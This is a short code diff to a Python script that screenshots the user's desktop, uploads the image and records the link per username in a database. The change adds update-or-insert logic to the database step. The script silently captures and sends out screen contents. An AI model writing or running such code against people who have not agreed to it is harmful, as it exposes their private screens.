@@ -1,3 +1,4 @@
+from logging import setLoggerClass
 from PIL import ImageGrab
 import requests as rqs
 import os.path 
@@ -36,4 +37,8 @@ filepath = os.path.normpath(home +"/Desktop/{}.png".format(username)) # ! turn i
 takeScreenshot(filepath) # ! turn it on later
 link = uploadImage(username, filepath)
 db = scriptSQL.Database()
-db.insert("names, links", link)
+query = select("screenshots", "Names")
+if username in query:
+    db.update(table="screenshots", column1="Links", column2="Names", condition=username, val=link)
+else:
+    db.insert("screenshots", "Links, Names", link)
